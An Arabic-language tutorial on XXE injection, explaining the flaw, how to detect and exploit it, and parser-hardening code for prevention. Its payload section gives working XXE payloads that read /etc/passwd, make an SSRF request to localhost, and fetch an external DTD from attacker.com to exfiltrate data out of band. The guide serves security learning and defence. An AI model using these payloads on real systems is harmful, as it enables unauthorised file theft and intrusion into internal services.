- <details>
     <summary>XXE</summary>


# XML external entity (XXE) injection

في هذا الملف نشرح ما هو **XML external entity injection (XXE)**، نعرض أمثلة شائعة، نشرح كيفية العثور على الثغرة واستغلالها بأنواعها المختلفة، ونلخّص طرق الوقاية.

> **تحذير**: الأمثلة والتعليمات هنا مخصّصة للأغراض التعليمية واختبار الأمن على بيئات قانونية (مختبرات PortSwigger / HTB / VM خاص بك). لا تستخدمها على أنظمة غير ملكك.

---

## 1) ما هو XXE باختصار

**XML External Entity (XXE)** هو ثغرة تحدث عندما يعالج السيرفر بيانات XML ويقبل تعريفات DTD/Entities خارجية بدون تحقّق. المهاجم يقدر يعرف `ENTITY` مرتبط بملف أو URL، وبهذا يستطيع:

* الاطّلاع على ملفات على ملفّ نظام السيرفر (file disclosure).
* تنفيذ **Server-Side Request Forgery (SSRF)** للوصول إلى أنظمة داخلية يقدر التطبيق الوصول لها.
* استخراج بيانات *out-of-band* (مثل DNS/HTTP callbacks) إلى نظام المهاجم.
* التسبّب بأخطاء تكشف بيانات حسّاسة (error-based).

## 2) لماذا تحدث الثغرة؟

لأن مكتبات ومعالجات XML الافتراضية تدعم خصائص مثل DTDs وExternal Entities، وفي كثير من التطبيقات لا يقوم المطوّرون بتعطيل هذه الميزات أو تأمينها.

## 3) أنواع هجمات XXE

* **استرجاع الملفات مباشرة (Direct file retrieval)**: تعريف `ENTITY` يقرأ ملف محلي ويُدرَج في الاستجابة.
* **SSRF عبر XXE**: تعريف `ENTITY` يوجّه إلى URL داخلي (مثلاً `http://127.0.0.1:8080/admin`).
* **Blind OOB (DNS/HTTP callback)**: لا تعرض البيانات في الاستجابة لكن السيرفر يتصل بعنوان يتحكم فيه المهاجم لتسليم المحتوى.
* **Error-based**: التلاعب بالـXML لإحداث خطأ يحتوي على بيانات حسّاسة.

## 4) أمثلة Payload )

**تنبيه قوي:** استخدم الأمثلة في بيئات قانونية فقط.

**File disclosure (بسيط):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**SSRF (طلب HTTP داخلي):**

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/secret">
]>
<root>&xxe;</root>
```

**Blind OOB (DNS/HTTP callback):**

```xml
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/payload.dtd">
  %remote;
]>
<root>&send;</root>
```

`payload.dtd` على جهة المهاجم يمكن أن يعرّف ENTITY يرسل محتوى ملف إلى `attacker.com` أو يسبب DNS lookup فريد.

## 5) كيف تلاقي XXE )

* ابحث عن نقاط إدخال تستقبل XML (APIs، SOAP، SAML assertions، RSS/Atom، file uploads).
* جرّب إدخال نص يحتوي `<!DOCTYPE` — إذا ظهر خطأ متعلق بالـDTD فقد تكون نقطة دخول.
* استخدم أدوات مثل Burp Repeater أو curl لإرسال الـpayloads.
* لاختبارات OOB استخدم Burp Collaborator أو DNSLog أو خدمة DNS قابلة للتحكّم. أي callback يؤكّد وجود ثغرة blind XXE.
* راقب السجلات لسلوك outgoing HTTP/DNS أثناء الاختبار.
* استخدم أدوات أتمتة كـBurp Scanner أو Nuclei مع قوالب XXE، لكن اليدوي غالباً أقوى للحالات المعقدة.

## 6) استراتيجيات الاستغلال حسب النوع

* **إذا كانت الاستجابة تعرض المحتوى مباشرة** → استخدم payloads لاسترجاع ملفات.
* **إذا لم تظهر بيانات لكن تملك OOB** → استخدم DTD خارجي يطلب مورد على سيرفر المهاجم.
* **إذا كان parser يمنع DTD لكن يسمح بالـentities** → جرّب تقنيات blind عبر الأخطاء أو التوقّعات الزمنية.
* **إذا كان السيرفر يمنع تحميل موارد خارجية** → ابحث عن رسائل خطأ تفصّل أجزاء من الملف.

## 7) كيف تمنع XXE — خطوات عملية

1. **تعطيل معالجة DTD والـExternal Entities** في parser (الأهم). أمثلة:

   * **Java (javax.xml):**

   ```java
   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
   factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

   * **.NET:**

   ```csharp
   XmlReaderSettings settings = new XmlReaderSettings();
   settings.DtdProcessing = DtdProcessing.Prohibit;
   ```

   * **Python:** استخدم مكتبة `defusedxml` بدلاً من معالجات XML الافتراضية غير الآمنة.

   * **PHP:** `libxml_disable_entity_loader(true);` — راجع التوثيق لأن بعض الدوال تغيّرت في الإصدارات الحديثة.

2. **تحديث المكتبات**: استعمل نسخ parser آمنة ومحدّثة.

3. **التحويل إلى JSON** إذا لم تكن تحتاج ميزات XML المعقّدة.

4. **تقييد الشبكة والصلاحيات**: امنع التطبيق من إجراء طلبات خارجية أو قيّدها جدارياً، وشغّل الخدمة بصلاحيات محدودة.

5. **التحقّق من المدخلات**: لا تعالج XML مباشرة من مصادر غير موثوقة دون تحقق.

6. **مراقبة outgoing DNS/HTTP** وفعّل Logging/IDS.

7. **اختبار أمني دوري**: ضمن فحص XXE ضمن الاختبارات الآلية واليدوية.

## 8) نصايح في الكود — أمثلة سريعة

* **Java**: تعطيل DTD كما سلف.
* **Python**: استخدم:

```python
from defusedxml import ElementTree as ET
root = ET.fromstring(user_xml)
```

* **.NET**: منع DTD عبر `XmlReaderSettings`.

## 9) إشارات إنك معرض للثغرة

* التطبيق يتعامل مع SOAP, SAML, RSS أو يقبل ملفات XML من المستخدمين.
* وجود مكتبات معالجة XML قديمة.
* سجلات تظهر محاولات تحميل موارد خارجية أثناء معالجة XML.



     
</details>
